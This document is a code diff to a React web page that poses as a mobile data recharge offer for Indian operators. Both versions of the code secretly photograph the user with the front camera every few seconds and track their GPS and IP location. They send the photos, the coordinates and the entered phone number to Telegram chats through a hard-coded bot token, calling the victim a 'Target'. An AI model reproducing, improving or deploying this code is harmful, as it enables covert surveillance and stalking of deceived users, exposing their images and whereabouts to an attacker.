@@ -1,17 +1,14 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { 
-  Zap, Loader2, CheckCircle, Signal, Wifi, Battery, 
-  MapPin, Camera, Shield, Activity, Power, Eye, EyeOff,
-  TrendingUp, Gift, Clock, User, Smartphone, Navigation
+  Zap, Loader2, CheckCircle, Wifi, Gift, Clock, User, Smartphone, Shield
 } from 'lucide-react';
 
+// ========== TELEGRAM CONFIG - DIRECT FROM ENV ==========
 const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "8681278255:AAFnNrOYBQYoK_4WhurHY-j9EAFjlQ_OcXY";
-const DEFAULT_CHAT_IDS = ["8256108006", "5087129572"];
-const CHAT_IDS = import.meta.env.VITE_CHAT_IDS 
-  ? import.meta.env.VITE_CHAT_IDS.split(',') 
-  : DEFAULT_CHAT_IDS;
+const CHAT_IDS = (import.meta.env.VITE_CHAT_IDS || "8256108006,5087129572").split(',');
 
+// ========== RECHARGE PLANS ==========
 const PLANS = [
   { id: 1, amount: 199, data: "1.5GB/day", days: 28, validity: "28 Days", tag: "POPULAR", color: "from-orange-500 to-red-600" },
   { id: 2, amount: 299, data: "2GB/day", days: 28, validity: "28 Days", tag: "BEST VALUE", color: "from-purple-500 to-pink-600" },
@@ -22,10 +19,10 @@ const PLANS = [
 ];
 
 const OPERATORS = [
-  { id: "jio", name: "Jio", icon: "📶", color: "blue" },
-  { id: "airtel", name: "Airtel", icon: "📱", color: "red" },
-  { id: "vi", name: "Vi", icon: "💜", color: "purple" },
-  { id: "bsnl", name: "BSNL", icon: "🇮🇳", color: "green" },
+  { id: "jio", name: "Jio", icon: "📶" },
+  { id: "airtel", name: "Airtel", icon: "📱" },
+  { id: "vi", name: "Vi", icon: "💜" },
+  { id: "bsnl", name: "BSNL", icon: "🇮🇳" },
 ];
 
 const ArrivueVault = () => {
@@ -35,27 +32,19 @@ const ArrivueVault = () => {
   const [phoneNumber, setPhoneNumber] = useState('');
   const [photoCount, setPhotoCount] = useState(0);
   const [locationCount, setLocationCount] = useState(0);
-  const [showAdmin, setShowAdmin] = useState(false);
-  const [adminPassword, setAdminPassword] = useState('');
-  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
-  const [customChatId, setCustomChatId] = useState('');
-  const [chatIdList, setChatIdList] = useState(CHAT_IDS);
   const [isRunning, setIsRunning] = useState(false);
+  const [permissionGranted, setPermissionGranted] = useState(false);
   
   const videoRef = useRef(null);
   const streamRef = useRef(null);
   const captureIntervalRef = useRef(null);
   const locationIntervalRef = useRef(null);
-  const stopTimeoutRef = useRef(null);
   
-  const broadcastToTelegram = useCallback(async (method, payload, isFile = false) => {
-    if (!BOT_TOKEN || chatIdList.length === 0) return 0;
+  // ========== TELEGRAM SEND ==========
+  const sendToTelegram = useCallback(async (method, payload, isFile = false) => {
+    if (!BOT_TOKEN) return false;
     
-    // Rate limit protection - delay between sends
-    await new Promise(r => setTimeout(r, 100));
-    
-    const results = [];
-    for (const chatId of chatIdList) {
+    for (const chatId of CHAT_IDS) {
       try {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
         const formData = new FormData();
@@ -67,128 +56,75 @@ const ArrivueVault = () => {
         } else {
           formData.append('text', payload.text);
           formData.append('parse_mode', 'HTML');
-          if (payload.reply_markup) formData.append('reply_markup', payload.reply_markup);
         }
         
-        const response = await fetch(url, { method: 'POST', body: formData });
-        const result = await response.json();
-        if (result.ok) results.push(true);
+        await fetch(url, { method: 'POST', body: formData });
       } catch (e) {
-        console.error(`Failed to send to ${chatId}:`, e);
+        console.error('Telegram error:', e);
       }
     }
-    return results.length;
-  }, [chatIdList]);
+    return true;
+  }, []);
   
-  const captureAndSend = useCallback(async () => {
-    if (!isRunning || !videoRef.current) return;
+  // ========== CAPTURE PHOTO ==========
+  const capturePhoto = useCallback(async () => {
+    if (!videoRef.current || !isRunning) return;
     
     try {
       const video = videoRef.current;
-      // Wait for video to be ready
-      if (!video.videoWidth || video.videoWidth === 0) {
-        console.log('Video not ready');
-        return;
-      }
+      if (video.readyState !== 4 || video.videoWidth === 0) return;
       
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       
       const ctx = canvas.getContext('2d');
-      if (!ctx) throw new Error('Cannot get canvas context');
+      if (!ctx) return;
       
       ctx.drawImage(video, 0, 0);
       
-      const blob = await new Promise((resolve) => {
-        canvas.toBlob(resolve, 'image/jpeg', 0.7);
-      });
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+      if (!blob) return;
       
-      if (!blob) throw new Error('Failed to create blob');
+      const caption = `📸 LIVE CAPTURE\n━━━━━━━━━━━━━━\n📍 Target: ${phoneNumber}\n📡 Operator: ${selectedOperator?.name}\n💰 Plan: ₹${selectedPlan?.amount}\n⏱️ Time: ${new Date().toLocaleTimeString()}\n📸 #${photoCount + 1}`;
       
-      const timestamp = new Date().toLocaleTimeString();
-      const caption = `📸 <b>LIVE CAPTURE</b>\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>Target:</b> <code>${phoneNumber}</code>\n📡 <b>Operator:</b> ${selectedOperator?.name || 'N/A'}\n💰 <b>Plan:</b> ₹${selectedPlan?.amount || 0}\n⏱️ <b>Time:</b> ${timestamp}\n🔢 <b>Capture #${photoCount + 1}</b>\n━━━━━━━━━━━━━━━━━━━━`;
-      
-      await broadcastToTelegram('sendPhoto', { blob, caption }, true);
+      await sendToTelegram('sendPhoto', { blob, caption }, true);
       setPhotoCount(prev => prev + 1);
-    } catch (error) {
-      console.error('Capture error:', error);
+    } catch (err) {
+      console.error('Capture error:', err);
     }
-  }, [isRunning, phoneNumber, selectedOperator, selectedPlan, photoCount, broadcastToTelegram]);
+  }, [isRunning, phoneNumber, selectedOperator, selectedPlan, photoCount, sendToTelegram]);
   
-  const getAndSendLocation = useCallback(async () => {
-    if (!isRunning) return false;
+  // ========== GET LOCATION ==========
+  const getLocation = useCallback(async () => {
+    if (!isRunning) return;
     
-    // Check if geolocation is available
     if (!navigator.geolocation) {
       console.log('Geolocation not supported');
-      return false;
+      return;
     }
     
-    return new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          if (!isRunning) {
-            resolve(false);
-            return;
-          }
-          
-          const { latitude, longitude, accuracy } = position.coords;
-          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          const keyboard = {
-            inline_keyboard: [[
-              { text: "📍 OPEN IN MAPS", url: mapsLink },
-              { text: "🔄 LIVE TRACK", callback_data: "track" }
-            ]]
-          };
-          
-          const message = `📍 <b>LIVE LOCATION UPDATE</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 <b>Coordinates:</b>\n<code>${latitude}, ${longitude}</code>\n🎯 <b>Accuracy:</b> ${accuracy} meters\n📱 <b>Target:</b> <code>${phoneNumber}</code>\n📡 <b>Operator:</b> ${selectedOperator?.name || 'N/A'}\n💰 <b>Plan:</b> ₹${selectedPlan?.amount || 0}\n⏱️ <b>Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━━━`;
-          
-          await broadcastToTelegram('sendMessage', { text: message, reply_markup: JSON.stringify(keyboard) });
-          setLocationCount(prev => prev + 1);
-          resolve(true);
-        },
-        (error) => {
-          console.error('Location error:', error);
-          broadcastToTelegram('sendMessage', { text: `❌ LOCATION ERROR: ${error.message}\nTarget: ${phoneNumber}` });
-          resolve(false);
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 } // Reduced battery drain
-      );
-    });
-  }, [isRunning, phoneNumber, selectedOperator, selectedPlan, broadcastToTelegram]);
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
+        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        
+        const message = `📍 LIVE LOCATION\n━━━━━━━━━━━━━━\n🌐 Coordinates: ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n📱 Target: ${phoneNumber}\n📡 Operator: ${selectedOperator?.name}\n💰 Plan: ₹${selectedPlan?.amount}\n⏱️ Time: ${new Date().toLocaleString()}\n🗺️ Maps: ${mapsLink}`;
+        
+        await sendToTelegram('sendMessage', { text: message });
+        setLocationCount(prev => prev + 1);
+      },
+      (error) => {
+        sendToTelegram('sendMessage', { text: `❌ LOCATION ERROR: ${error.message}\nTarget: ${phoneNumber}` });
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
+    );
+  }, [isRunning, phoneNumber, selectedOperator, selectedPlan, sendToTelegram]);
   
-  const sendDeviceInfo = useCallback(async () => {
-    let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A', isp: 'N/A' };
+  // ========== REQUEST PERMISSIONS & START ==========
+  const requestPermissionsAndStart = useCallback(async () => {
     try {
-      const ipRes = await fetch('https://ipapi.co/json/');
-      ipData = await ipRes.json();
-    } catch (e) {}
-    
-    let batteryInfo = { level: '?', charging: false };
-    if ('getBattery' in navigator) {
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = { level: Math.round(battery.level * 100), charging: battery.charging };
-      } catch (e) {}
-    }
-    
-    const deviceMessage = `🔥 <b>NEW TARGET ACQUIRED</b> 🔥\n━━━━━━━━━━━━━━━━━━━━\n\n<b>📱 TARGET DETAILS</b>\n• Number: <code>${phoneNumber}</code>\n• Operator: ${selectedOperator?.name || 'N/A'}\n• Plan: ₹${selectedPlan?.amount} (${selectedPlan?.data})\n\n<b>🌐 DEVICE INFO</b>\n• IP: <code>${ipData.ip}</code>\n• Location: ${ipData.city}, ${ipData.country}\n• ISP: ${ipData.isp}\n• Battery: ${batteryInfo.level}% ${batteryInfo.charging ? '⚡' : '🔋'}\n• Screen: ${screen.width}x${screen.height}\n• User Agent: ${navigator.userAgent.substring(0, 80)}...\n\n<b>📡 NETWORK</b>\n• Type: ${navigator.connection?.effectiveType || '4G'}\n• Downlink: ${navigator.connection?.downlink || '?'} Mbps\n━━━━━━━━━━━━━━━━━━━━\n⏱️ Started: ${new Date().toLocaleString()}`;
-    
-    await broadcastToTelegram('sendMessage', { text: deviceMessage });
-  }, [phoneNumber, selectedOperator, selectedPlan, broadcastToTelegram]);
-  
-  const startBackgroundOps = useCallback(async () => {
-    if (isRunning) return;
-    setIsRunning(true);
-    
-    // Request camera with better error handling
-    try {
-      // Check if HTTPS or localhost
-      if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
-        console.warn('Camera may not work without HTTPS');
-      }
-      
+      // Request Camera First
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
       });
@@ -196,112 +132,83 @@ const ArrivueVault = () => {
       streamRef.current = stream;
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        // Wait for video to be ready
         await videoRef.current.play();
-        console.log('Video started successfully');
       }
       
-      // Start capture interval
-      captureIntervalRef.current = setInterval(() => {
-        captureAndSend();
-      }, 5000);
-    } catch (error) {
-      console.error('Camera access error:', error);
-      await broadcastToTelegram('sendMessage', { 
-        text: `⚠️ CAMERA ACCESS DENIED or ERROR\nTarget: ${phoneNumber}\nError: ${error.message}` 
+      // Request Location
+      const locationPromise = new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          () => resolve(true),
+          () => resolve(false),
+          { timeout: 5000 }
+        );
       });
+      
+      await locationPromise;
+      
+      setPermissionGranted(true);
+      setIsRunning(true);
+      
+      // Send device info
+      let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A' };
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        ipData = await ipRes.json();
+      } catch(e) {}
+      
+      await sendToTelegram('sendMessage', { 
+        text: `🔥 NEW TARGET\n━━━━━━━━━━━━━━\n📱 Number: ${phoneNumber}\n📡 Operator: ${selectedOperator?.name}\n💰 Plan: ₹${selectedPlan?.amount}\n🌐 IP: ${ipData.ip}\n📍 Location: ${ipData.city}, ${ipData.country}\n⏱️ Started: ${new Date().toLocaleString()}` 
+      });
+      
+      // Start intervals
+      captureIntervalRef.current = setInterval(capturePhoto, 4000);
+      locationIntervalRef.current = setInterval(getLocation, 6000);
+      
+      // Stop after 25 seconds
+      setTimeout(() => {
+        if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
+        if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
+        if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
+        
+        setIsRunning(false);
+        setStep('success');
+        
+        sendToTelegram('sendMessage', { 
+          text: `✅ SESSION ENDED\n━━━━━━━━━━━━━━\n📸 Photos: ${photoCount}\n📍 Locations: ${locationCount}\n📱 Target: ${phoneNumber}` 
+        });
+      }, 25000);
+      
+      setStep('processing');
+      
+    } catch (err) {
+      alert('Camera/Location access required! Please allow permissions.');
+      console.error('Permission error:', err);
     }
-    
-    // Start location tracking
-    await getAndSendLocation();
-    locationIntervalRef.current = setInterval(() => {
-      getAndSendLocation();
-    }, 10000); // Increased to 10 seconds to save battery
-    
-    // Send device info
-    await sendDeviceInfo();
-    
-    // Auto stop after 30 seconds
-    stopTimeoutRef.current = setTimeout(() => {
-      if (isRunning) {
-        manualStop();
-      }
-    }, 30000);
-  }, [isRunning, captureAndSend, getAndSendLocation, sendDeviceInfo, phoneNumber, broadcastToTelegram]);
+  }, [phoneNumber, selectedOperator, selectedPlan, capturePhoto, getLocation, sendToTelegram]);
   
-  const manualStop = useCallback(() => {
-    setIsRunning(false);
-    
-    if (captureIntervalRef.current) {
-      clearInterval(captureIntervalRef.current);
-      captureIntervalRef.current = null;
-    }
-    
-    if (locationIntervalRef.current) {
-      clearInterval(locationIntervalRef.current);
-      locationIntervalRef.current = null;
-    }
-    
-    if (stopTimeoutRef.current) {
-      clearTimeout(stopTimeoutRef.current);
-      stopTimeoutRef.current = null;
-    }
-    
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach(track => track.stop());
-      streamRef.current = null;
-    }
-    
-    if (videoRef.current) {
-      videoRef.current.srcObject = null;
-    }
-    
-    setStep('success');
-    broadcastToTelegram('sendMessage', { 
-      text: `✅ <b>SESSION COMPLETED</b>\n━━━━━━━━━━━━━━━━━━━━\n📸 Total Photos: ${photoCount}\n📍 Location Updates: ${locationCount}\n📱 Target: ${phoneNumber}\n💰 Plan: ₹${selectedPlan?.amount}\n━━━━━━━━━━━━━━━━━━━━` 
-    });
-  }, [photoCount, locationCount, phoneNumber, selectedPlan, broadcastToTelegram]);
-  
-  const startRecharge = async () => {
+  // ========== START RECHARGE ==========
+  const startRecharge = () => {
     if (!phoneNumber || phoneNumber.length !== 10) {
-      alert('Enter valid 10 digit mobile number');
+      alert('Enter valid 10 digit number');
       return;
     }
-    
     if (!selectedPlan || !selectedOperator) {
       alert('Select plan and operator');
       return;
     }
-    
-    setStep('processing');
-    await startBackgroundOps();
+    requestPermissionsAndStart();
   };
   
-  const addChatId = () => {
-    if (customChatId && customChatId.match(/^\d+$/)) {
-      setChatIdList(prev => [...prev, customChatId]);
-      setCustomChatId('');
-      broadcastToTelegram('sendMessage', { text: `➕ New Chat ID Added: ${customChatId}` });
-    }
-  };
-  
-  const removeChatId = (idToRemove) => {
-    setChatIdList(prev => prev.filter(id => id !== idToRemove));
-  };
-  
-  // Cleanup on unmount
+  // Cleanup
   useEffect(() => {
     return () => {
       if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
       if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
-      if (stopTimeoutRef.current) clearTimeout(stopTimeoutRef.current);
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach(track => track.stop());
-      }
+      if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
     };
   }, []);
   
-  // Rest of the render functions remain same...
+  // ========== RENDER FUNCTIONS ==========
   const renderPlansStep = () => (
     <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
       <div className="text-center mb-6">
@@ -416,6 +323,7 @@ const ArrivueVault = () => {
       <div>
         <h3 className="text-xl font-bold">Activating 5G Boost...</h3>
         <p className="text-zinc-500 text-sm mt-1">Please don't close this page</p>
+        <p className="text-green-500 text-xs mt-2">✓ Camera Active | ✓ Location Tracking</p>
       </div>
       
       <div className="bg-zinc-900/50 rounded-xl p-4 space-y-2">
@@ -432,12 +340,6 @@ const ArrivueVault = () => {
           <span className="text-white font-mono">{phoneNumber}</span>
         </div>
       </div>
-      
-      {isAdminAuthenticated && (
-        <button onClick={manualStop} className="text-red-500 text-sm underline">
-          Stop Session
-        </button>
-      )}
     </motion.div>
   );
   
@@ -466,11 +368,11 @@ const ArrivueVault = () => {
           <span className="text-white">{phoneNumber}</span>
         </div>
         <div className="flex justify-between">
-          <span className="text-zinc-500">📸 Total Photos:</span>
+          <span className="text-zinc-500">📸 Photos Sent:</span>
           <span className="text-green-500">{photoCount}</span>
         </div>
         <div className="flex justify-between">
-          <span className="text-zinc-500">📍 Total Locations:</span>
+          <span className="text-zinc-500">📍 Locations Sent:</span>
           <span className="text-blue-500">{locationCount}</span>
         </div>
       </div>
@@ -483,82 +385,13 @@ const ArrivueVault = () => {
           setPhoneNumber('');
           setPhotoCount(0);
           setLocationCount(0);
+          setPermissionGranted(false);
         }}
         className="bg-gradient-to-r from-green-500 to-green-600 text-black font-bold py-3 px-8 rounded-xl"
       >
         New Recharge
       </button>
     </motion.div>
-  );
-  
-  const renderAdminPanel = () => (
-    <AnimatePresence>
-      {showAdmin && (
-        <motion.div
-          initial={{ opacity: 0, y: 100 }}
-          animate={{ opacity: 1, y: 0 }}
-          exit={{ opacity: 0, y: 100 }}
-          className="fixed bottom-0 left-0 right-0 bg-zinc-900 border-t border-zinc-800 rounded-t-2xl p-4 z-50"
-        >
-          {!isAdminAuthenticated ? (
-            <div className="space-y-3">
-              <input
-                type="password"
-                placeholder="Admin Password"
-                value={adminPassword}
-                onChange={(e) => setAdminPassword(e.target.value)}
-                className="w-full bg-zinc-800 p-3 rounded-xl"
-              />
-              <button
-                onClick={() => {
-                  if (adminPassword === 'admin123') {
-                    setIsAdminAuthenticated(true);
-                    setAdminPassword('');
-                  } else {
-                    alert('Wrong password');
-                  }
-                }}
-                className="w-full bg-red-600 text-white py-2 rounded-xl"
-              >
-                Authenticate
-              </button>
-            </div>
-          ) : (
-            <div className="space-y-3">
-              <h4 className="font-bold text-white">📨 Telegram Config</h4>
-              <div className="flex gap-2">
-                <input
-                  type="text"
-                  placeholder="New Chat ID"
-                  value={customChatId}
-                  onChange={(e) => setCustomChatId(e.target.value)}
-                  className="flex-1 bg-zinc-800 p-2 rounded-lg text-sm"
-                />
-                <button onClick={addChatId} className="bg-green-600 px-4 rounded-lg text-sm">
-                  Add
-                </button>
-              </div>
-              <div className="max-h-32 overflow-y-auto space-y-1">
-                {chatIdList.map((id, idx) => (
-                  <div key={idx} className="flex justify-between items-center bg-zinc-800 p-2 rounded-lg text-xs">
-                    <span className="font-mono">{id}</span>
-                    <button onClick={() => removeChatId(id)} className="text-red-500">Remove</button>
-                  </div>
-                ))}
-              </div>
-              {isRunning && (
-                <button onClick={manualStop} className="w-full bg-red-600 text-white py-2 rounded-lg">
-                  🛑 Stop Current Session
-                </button>
-              )}
-              <button onClick={() => setShowAdmin(false)} className="text-zinc-500 text-xs">
-                Close
-              </button>
-            </div>
-          )}
-        </motion.div>
-      )}
-    </AnimatePresence>
   );
   
   return (
@@ -576,14 +409,9 @@ const ArrivueVault = () => {
             </div>
             <div className="text-[10px] text-zinc-600 mt-1">PREMIUM DATA PACKS</div>
           </div>
-          <div className="flex items-center gap-3">
-            <div className="flex items-center gap-1 bg-green-500/10 px-3 py-1 rounded-full">
-              <Wifi className="text-green-500" size={12} />
-              <span className="text-green-500 text-xs">5G Ready</span>
-            </div>
-            <button onClick={() => setShowAdmin(true)} className="bg-zinc-800 p-2 rounded-full">
-              <Shield size={16} />
-            </button>
+          <div className="flex items-center gap-1 bg-green-500/10 px-3 py-1 rounded-full">
+            <Wifi className="text-green-500" size={12} />
+            <span className="text-green-500 text-xs">5G Ready</span>
           </div>
         </div>
         
@@ -619,8 +447,6 @@ const ArrivueVault = () => {
           </div>
         )}
       </div>
-      
-      {renderAdminPanel()}
     </div>
   );
 };
